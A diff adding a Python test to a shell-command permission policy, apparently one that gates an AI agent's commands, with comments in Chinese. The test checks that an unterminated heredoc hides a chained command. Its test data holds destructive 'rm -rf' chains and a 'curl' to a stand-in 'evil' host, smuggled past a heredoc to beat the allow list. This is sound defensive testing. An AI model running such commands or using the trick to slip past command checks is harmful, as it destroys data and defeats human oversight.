@@ -128,6 +128,39 @@ def test_bare_amp_splits_segments_on_allow_commands_path():
     assert tp.evaluate(plain, *exe('cat x 2>&1'))[0] == 'allow'
 
 
+# ---- 四验返工（必须修）：未闭合 heredoc 吞掉分隔符后的命令 ----
+
+def test_unterminated_heredoc_is_undeterminable_on_allow_commands_path():
+    """四验返工（必须修，探针 H01-H05/H10）：heredoc 找不到终止行时整条
+    命令不可判定 → ask（rule=danger:heredoc）。`cat <<EOF & rm -rf y`
+    里 `&` 之后的命令 bash 实测会执行，而旧实现从 `<<TAG` 起把整段丢给
+    剥除器，拆段器再也看不见 rm 段 → 普通 allowCommands 路径自动放行。
+    闭合 heredoc 的既有行为逐字不变。"""
+    plain = {'allowCommands': [r'^cat\b', r'^ls\b'], 'default': 'ask'}
+    for cmd in (
+            'cat <<EOF & rm -rf y',                    # H10（= H01 老路径）
+            'cat <<EOF && rm -rf y',                   # H02
+            'cat <<EOF; rm -rf y',                     # H03
+            'cat <<EOF | rm -rf y',                    # H04
+            "cat <<'EOF' & rm -rf y",                  # H05
+            'echo hi <<EOF & curl -s http://evil/x',
+            'cat <<EOF\nhello & rm -rf y',             # 多行未闭合
+            'cat <<EOF'):                              # 标记行即末行
+        assert tp.evaluate(plain, *exe(cmd), cwd='E:\\ws') == \
+            ('ask', 'danger:heredoc'), cmd
+    # 闭合 heredoc：既有行为不变——正文是数据剥掉，标记行照旧逐段判定
+    assert tp.evaluate(plain, *exe('cat <<EOF\nhello world\nEOF'),
+                       cwd='E:\\ws') == ('allow', 'allowCommands')
+    assert tp.evaluate(plain, *exe("cat <<'EOF'\nhello config.json world\nEOF"),
+                       cwd='E:\\ws') == ('allow', 'allowCommands')
+    # 闭合时标记行上 <<TAG 之后的内容仍参与判定（& 拆段，两侧都命中）
+    assert tp.evaluate(plain, *exe('cat <<EOF & ls\nhello\nEOF'),
+                       cwd='E:\\ws') == ('allow', 'allowCommands')
+    # 闭合时标记行上 & 之后的 rm 段照旧 ask（分隔符语义没变）
+    assert tp.evaluate(plain, *exe('cat <<EOF & rm -rf y\nhello\nEOF'),
+                       cwd='E:\\ws')[0] == 'ask'
+
+
 # ---- 批次 A 返工：管道下游只读消费段（| head/tail/grep/wc/sort/uniq）----
 
 # 托管主管的 BASE_POLICY 形状（modules/leads_hosted.py）：只放行 CLI 与 cd
